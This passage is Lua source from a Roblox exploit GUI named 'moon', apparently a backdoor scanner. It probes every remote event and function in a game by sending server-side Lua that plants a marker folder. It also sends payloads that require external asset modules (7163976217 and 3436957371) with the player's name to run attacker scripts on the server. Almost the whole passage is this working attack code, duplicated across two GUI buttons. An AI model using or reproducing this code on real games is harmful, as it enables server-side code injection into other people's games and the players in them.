	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7163976217).VK(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_71);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_7b()
	local script = G2L["7b"];
	local color = {
		orange = Color3.fromRGB(232, 117, 35);
		itself = Color3.fromRGB(49, 49, 49)
	}

	local frame = script.Parent

	for _, v in pairs(frame:GetChildren()) do
		if v:IsA("TextButton") then
			v.MouseEnter:Connect(function()
				v.BackgroundColor3 = color.orange
			end)

			v.MouseLeave:Connect(function()
				v.BackgroundColor3 = color.itself
			end)
		end
	end
end;
task.spawn(C_7b);
-- StarterGui.ScreenGui.Main.R6.LocalScript
local function C_7d()
	local script = G2L["7d"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(3436957371):r6(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_7d);

return G2L["1"], require;
